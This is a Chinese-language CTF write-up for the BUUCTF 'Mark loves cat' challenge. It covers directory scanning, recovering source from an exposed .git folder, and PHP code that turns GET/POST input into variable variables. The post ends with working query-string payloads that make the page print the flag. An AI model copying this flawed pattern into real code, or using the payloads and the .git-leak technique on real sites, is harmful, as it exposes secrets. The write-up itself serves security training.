# Mark_Loves_Cat


打开靶场是一个非常正式的网页？到处扒拉一下，也在`contact`处进行了intruder测试，没有什么结果。

再查看页面代码和网络，也没有什么。所以又启动TOOLs。

那句话怎么说来着？`dirmap`一扫描起来，就发了狠……反正扫出很多东西。

&lt;!--more--&gt;

比较瞩目的是前排好多`zip`，`www`，`rar`，`bak`——因为之前一些靶场中，这些往往就是把源码下载到本地的URL。

```http

[200][application/octet-stream][137.00b] http://e504e764-ea4e-4800-9e92-02b69f55df33.node4.buuoj.cn/.git/config

[200][text/html; charset=UTF-8][28.44kb] http://e504e764-ea4e-4800-9e92-02b69f55df33.node4.buuoj.cn/admin.rar

[200][text/html; charset=UTF-8][28.44kb] http://e504e764-ea4e-4800-9e92-02b69f55df33.node4.buuoj.cn/2.rar

[200][text/html; charset=UTF-8][28.44kb] http://e504e764-ea4e-4800-9e92-02b69f55df33.node4.buuoj.cn/a.rar

[200][text/html; charset=UTF-8][28.44kb] http://e504e764-ea4e-4800-9e92-02b69f55df33.node4.buuoj.cn/2014.rar

[200][text/html; charset=UTF-8][28.44kb] http://e504e764-ea4e-4800-9e92-02b69f55df33.node4.buuoj.cn/2015.zip

[200][text/html; charset=UTF-8][28.44kb] http://e504e764-ea4e-4800-9e92-02b69f55df33.node4.buuoj.cn/bak.rar

[200][text/html; charset=UTF-8][28.44kb] http://e504e764-ea4e-4800-9e92-02b69f55df33.node4.buuoj.cn/bbs.zip

[200][text/html; charset=UTF-8][28.44kb] http://e504e764-ea4e-4800-9e92-02b69f55df33.node4.buuoj.cn/2.zip

...仅截取部分

```

  

不过这次一个个点开，没有一个进行下载任务。

目标转向第一个文件`/.git/`。&lt;font size=1&gt;如果用github clone或者配置过github pages&#43;hexo那倒霉玩意的，可能有点熟悉这个是什么。&lt;/font&gt;

  

出动`GitHack`

下载下来一个文件夹，里面有：

```txt

assets

flag.php

index.php

```

  

----

  

# $$x?第一次看还觉得很陌生……

  

`flag.php`中：

```php

&lt;?php

  

$flag = file_get_contents(&#39;/flag&#39;);

```

  

在`index.php`中看到：

```php

&lt;?php

  

include &#39;flag.php&#39;;

  

$yds = &#34;dog&#34;;

$is = &#34;cat&#34;;

$handsome = &#39;yds&#39;;

  

foreach($_POST as $x =&gt; $y){

    $$x = $y;

}

  

foreach($_GET as $x =&gt; $y){

    $$x = $$y;

}

  

foreach($_GET as $x =&gt; $y){

    if($_GET[&#39;flag&#39;] === $x &amp;&amp; $x !== &#39;flag&#39;){

        exit($handsome);

    }

}

  

if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;])){

    exit($yds);

}

  

if($_POST[&#39;flag&#39;] === &#39;flag&#39;  || $_GET[&#39;flag&#39;] === &#39;flag&#39;){

    exit($is);

}

  

echo &#34;the flag is: &#34;.$flag;

```

依旧是先translate一下：

- 1.包含`flag.php`文件

- 2.三个变量如代码所述不再重复

- 3.`foreach()`函数：用于遍历数组中的每个元素，并将当前元素的值赋给一个变量

    - 1）获取当前元素的键名（`$key`获取）：`foreach ($array as $key =&gt; $value）{// 执行操作}`

    - 2）遍历对象属性(`$key`获取当前属性名称，`$value`获取当前属性的值)：`foreach ($object as $key =&gt; $value) {// 执行操作}`

- 4.可变变量`$$x`：是一种特殊的语法，允许使用变量的值作为另一个变量的名称。`$a = &#39;hello&#39;;$b = &#39;a&#39;;echo $$b;  // 输出：hello`

  
  

----

  

# foreach()

  

```php

foreach($_POST as $x =&gt; $y){

    $$x = $y;

}

//POST传入ass=flag, $x=ass, $y=flag, $$x=$y=$ass=flag

  
  

foreach($_GET as $x =&gt; $y){

    $$x = $$y;

}

//GET传入ass=flag, $x=ass, $y=flag, $$y=$flag, $$x=$ass, $$x=$$y=$flag, $ass=$flag

```

## 1

  

```php

foreach($_GET as $x =&gt; $y){

    if($_GET[&#39;flag&#39;] === $x &amp;&amp; $x !== &#39;flag&#39;){

        exit($handsome);

    }

}

```

  

GET传入`flag=?`，进行判断:

  

- 1.如果`$_GET[&#39;flag&#39;]`(获取通过 GET 请求方式传递的参数中名为 &#34;flag&#34; 的值的方法)等于`$x`

- 2.并且`$x`不等于flag就输出`$handsome`的值。

  

### payload

  

flag=ass,`$_GET[&#39;flag&#39;]`=ass, `$x`=flag, 不符合判断条件

  

flag=ass&amp;ass=flag, 有两个键值对flag=&gt;ass, ass=&gt;flag，

  

- 1.`$_GET[&#39;flag&#39;]`=ass, `$x`=flag不成立——`ass!=flag &amp;&amp; flag==flag`

- 2.`$_GET[&#39;flag&#39;]`=ass, `$x`=ass,成立——`ass===ass &amp;&amp; ass!==flag`输出`$handsome`。

  
  

**最终Payload**

1.`?handsome=flag&amp;flag=s&amp;s=flag`：比较麻烦的一种，就是遵循上述逻辑

2.`?handsome=flag&amp;flag=handsome`：最佳，没有把第二个foreach()忽略，使`$handsome`=`$flag`，同时引用上面的逻辑进行了解题。

  

## 2

  

```php

if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;])){

    exit($yds);

}

//GET请求和POST请求中都没有名为 &#34;flag&#34; 的参数，则执行 exit($yds)

```

`?yds=flag`即可，原理是第二个foreach()

  

## 3

  

```php

if($_POST[&#39;flag&#39;] === &#39;flag&#39;  || $_GET[&#39;flag&#39;] === &#39;flag&#39;){

    exit($is);

}

//

```

  

`?flag=flag&amp;is=flag`

  

----

  

POST没有变量$x=$y所以2和3（好像）都只有GET方式的解决方式。但是我昨天晚上记得随便POST传参yds=flag确实得到flag了。。。可能只是幻觉&lt;br&gt;如果问flag在哪里那我只能说，flag与你同在。

  
  

----

  

# ファンワイ Bypass

  

&gt;GET传参，1默认类型为int，作为value时类型为string。

  

`?handsome=flag&amp;flag=1&amp;1=flag`：

flag=(string)1&amp;(int)1=flag，所以就发生了一点Bypass——无法进入if判断语句，就绕过它。得到一个`the flag is:`。


---

> Author:   
> URL: https://66lueflam144.github.io/posts/38e9ef8/  

